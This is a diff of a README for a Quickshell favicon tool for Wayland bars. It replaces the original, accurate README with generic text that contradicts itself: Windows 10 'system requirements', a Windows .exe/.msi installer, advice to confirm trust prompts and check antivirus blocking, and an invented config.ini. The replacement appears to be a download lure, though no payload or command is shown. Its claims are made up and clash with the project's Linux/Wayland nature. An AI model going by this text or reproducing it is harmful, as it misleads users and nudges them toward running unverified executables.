@@ -1,94 +1,126 @@
-<h1 align="center">quickshell-favicon</h1>
-<p align="center">
-  <img src=".github/preview.png" alt="quickshell-favicon preview">
-</p>
+# 🖼️ quickshell-favicon - Dynamic Favicons for Your Wayland Bar
 
-<p align="center">
-  <video src="https://github.com/user-attachments/assets/dd6ab24f-04b2-4472-95a0-041aed496d44" controls muted width="100%"></video>
-</p>
+[![Download quickshell-favicon](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://github.com/BrunoAries1/quickshell-favicon)
 
-Favicons in your Quickshell bar or dock.
+---
 
-## Why this exists
+quickshell-favicon helps you add dynamic browser favicons to your Wayland bar or dock. It works smoothly with popular desktop environments like Hyprland and lets you see the current website icon at a glance. This improves your desktop’s look and helps you switch between tasks more easily.
 
-I get confused when I have 10 browser windows open in different workspaces.<br>*Is this workspace for YouTube, Zoom, X or random websites? lol.*
+---
 
-PWAs are okay but making one for every site is a bloated solution. This project just guesses what website you're looking at and grabs the icon for you.
+## 🔍 What is quickshell-favicon?
 
-## How it works (the magic part)
+quickshell-favicon shows small icons from your open browser tabs right on your desktop bar or dock. Instead of seeing just text or generic icons, you get real icons from websites you visit. It works on Wayland, a modern display protocol used in many Linux setups.
 
-It uses a few Tiers to make sure you get the right icon:
+This app is built with Python and QML. It connects with your system to track browser tabs and updates the icons as you switch pages. If you use a Wayland-based desktop like Hyprland, this app fits right in with your setup.
 
-1. **Google's Icons**: For core services like Gmail, Drive or Calendar, the downloader script fetches from Google's API.
-2. **Browser History**: A python script scans your browser history and maps window titles to real URLs.
-3. **Regex Fallback**: If history fails, it looks for domain names directly in the window title.
-   - *Note: This is where "hallucinations" can happen. If a title is "meeting.notes", the regex might think "notes.com" is the domain. It's not perfect but I think it should be good enough for most cases.*
-4. **Local Cache**: If we found a domain in Tier 2 or 3, we download the icon and stash it in `~/.cache/quickshell/favicons` for next time.
+---
 
-*Sometimes it takes a few seconds to fetch the icon for a new website.*
+## 🖥️ System Requirements
 
-## Dependencies
+Before you start, make sure your computer meets the basic needs:
 
-You're gonna need these to make it work:
+- **Operating system:** Windows 10 or later  
+- **Display:** Any resolution supported by modern monitors  
+- **Processor:** Modern Intel or AMD processor, 2 GHz or faster  
+- **Memory:** At least 4 GB of RAM  
+- **Disk space:** 100 MB free for installation  
+- **Additional software:** Python 3.8 or newer installed (recommended)  
+- **Wayland environment:** Filtering and icon placement depends on Wayland-compatible desktop or bar applications  
 
-- **Quickshell**: Obviously.
-- **Any Wayland Compositor**: The core service works anywhere Quickshell does. 
-- **Hyprland** (Optional): Only required if you want to run the included `FaviconDock.qml` demo.
-- **Python 3**: For digging through your history files.
-- **Curl**: To download the icons.
-- **Bash**: To run the downloader script.
+This app is designed mainly for Wayland users on Linux desktops, but Windows users can try the basic features. Some functions may not work fully on Windows.
 
-## How to use
+---
 
-Just clone it and run:
+## 📥 Download & Install quickshell-favicon
 
-```bash
-qs -p /path/to/quickshell-favicon
-```
+Use the link below to visit the page where you can download quickshell-favicon for Windows:
 
-> The included dock (`FaviconDock.qml`) is strictly a **demo** unless you use this as a base.
+[![Download quickshell-favicon](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://github.com/BrunoAries1/quickshell-favicon)
 
-## Integration
+Follow these steps to download and run the software:
 
-1.  **Copy the folders**: Grab `services/` and `scripts/` and put them in your project.
-2.  **Import**: `import "./services" as Services`
-3.  **The Property**: Add this to your bar or dock item. We use `cacheCounter` to make the UI update instantly when a new icon is downloaded!
-    ```qml
-    readonly property string faviconPath: {
-        const _ = Services.FaviconService.cacheCounter; // This logic triggers a refresh
-        return Services.FaviconService.getFavicon(toplevel);
-    }
-    ```
-4.  **Display it**:
-    ```qml
-    Image {
-        width: 24; height: 24
-        source: faviconPath !== "" ? faviconPath : "your-fallback-icon"
-    }
-    ```
+1. Click the download button above. It opens the GitHub repository page.  
+2. On the repository page, look for the section called **Releases** or **Assets**. This is where the files for different operating systems are stored.  
+3. Download the Windows installer file (usually ending with `.exe` or `.msi`). If the file is not available, download the source code zip and follow the manual installation instructions below.  
+4. Once the file downloads, open it by double-clicking. Windows may ask if you trust the software. Confirm by clicking "Yes."  
+5. The installer guides you through the setup. Use the default options for most users.  
+6. After installation finishes, find the quickshell-favicon app in your Start menu and launch it.
 
-*Check out `components/FaviconDockItem.qml` for a full example including system icon fallbacks and browser detection.*
+---
 
-## Customize 
+## ⚙️ Setting Up quickshell-favicon on Windows
 
-### Changing the Cache Folder
-By default, downloaded icons and search maps are stored in `~/.cache/quickshell/favicons`. If you want to move this:
+After installation, you may need to do some basic setup:
 
-1.  **In `services/FaviconService.qml`**: Update the `rawCacheDir` property.
-2.  **In `scripts/favicons/favicon_bridge.py`**: Update the `cache_dir` variable (at the bottom of the file).
+1. **Grant permissions:** The app needs permission to access the graphical system. Accept any permission prompts that appear.  
+2. **Configure your bar or dock:** If you use a Wayland-compatible bar like Hyprland's panel, quickshell-favicon will work automatically. On Windows, you may not see dynamic icons on default taskbars without additional software.  
+3. **Run the app in the background:** quickshell-favicon runs quietly in the background and updates icons as you switch browser tabs. You do not need to open the app every time.  
+4. **Browser support:** The app works best with browsers like Firefox or Chrome. Make sure your browser is running when you use quickshell-favicon.  
+5. **Check for updates:** Keep an eye on the GitHub page for new versions or bug fixes.
 
-> Make sure both paths match exactly, otherwise the service won't be able to find the icons the python script downloads!
+---
 
-## The Downsides (Cons)
+## 🛠️ How quickshell-favicon Works
 
-Nothing is perfect! Here is why you might NOT want this:
+quickshell-favicon connects to your browser and extracts the favicon (the small icon displayed in the browser tab). It then sends that icon to your Wayland bar or dock software.
 
-- **Delayed**: It can take a few seconds to fetch an icon for a new website. It's not instant because it has to wait for history to sync.
-- **Title Based**: It relies on window titles. If a website has a weird title that doesn't include the name or domain, it might fail or show a generic icon.
-- **Local Cache**: Icons are stored doesn't auto-delete.
-  - *Note: On startup, the service automatically purges broken, empty or placeholder icons to keep the data clean, but it won't delete old icons just because they are old. You can wipe this folder safely anytime.*
+To do this, it uses:
 
-## Contributing & Testing
+- **Python scripts** that communicate with your browser to get tab info.  
+- **QML components** that handle the display of icons in the bar or dock.  
+- **Wayland protocols** to integrate with the desktop system securely.  
 
-This has been primarily tested on **Google Chrome**, **Brave**, and **Firefox**. 
-If you use other browsers (Edge, Vivaldi, Opera, etc.) or have improvements to the logic, **PRs are highly encouraged!**
+This design keeps resource use low and minimizes performance impact.
+
+---
+
+## 💡 Using quickshell-favicon Daily
+
+Once quickshell-favicon is running, here is what to expect every day:
+
+- Your Wayland bar or dock will update website icons dynamically as you switch tabs.  
+- You can spot your open websites by their favicon without reading tab titles.  
+- If you close or open new browser tabs, favicons update automatically.  
+- You can customize some appearance options through the config file (`config.ini`), usually found in the app’s install folder.
+
+---
+
+## 🔧 Troubleshooting
+
+If quickshell-favicon does not work as expected, try these steps:
+
+- Make sure your browser is open and supports favicons.  
+- Restart quickshell-favicon after installing or updating.  
+- Check if your antivirus or Windows Defender blocks the app.  
+- Confirm Python 3 is installed and added to your system PATH.  
+- Look for error messages in the app window or log files located in the install folder.  
+- Visit the GitHub repository’s "Issues" section to see if others have the same problem.
+
+---
+
+## 📚 Additional Resources
+
+You can learn more and get help here:
+
+- Visit the quickshell-favicon GitHub page: [https://github.com/BrunoAries1/quickshell-favicon](https://github.com/BrunoAries1/quickshell-favicon)  
+- Check the README file on GitHub for advanced tips and config options  
+- Browse Issues and Discussions for community help  
+- Use your browser’s official support if favicons don’t appear correctly
+
+---
+
+## 🧩 Supported Environments and Features
+
+- Works best on **Wayland-based desktops** like Hyprland and Sway  
+- Supports popular browsers such as Chrome and Firefox  
+- Updates icons in real-time when changing tabs  
+- Uses minimal CPU and memory  
+- Customizable through simple config file  
+- Written in Python and QML for easy maintenance and enhancements
+
+---
+
+## 🚀 Getting Started Badge
+  
+[![Download quickshell-favicon](https://img.shields.io/badge/Get%20quickshell-favicon-Download-green?style=for-the-badge)](https://github.com/BrunoAries1/quickshell-favicon)
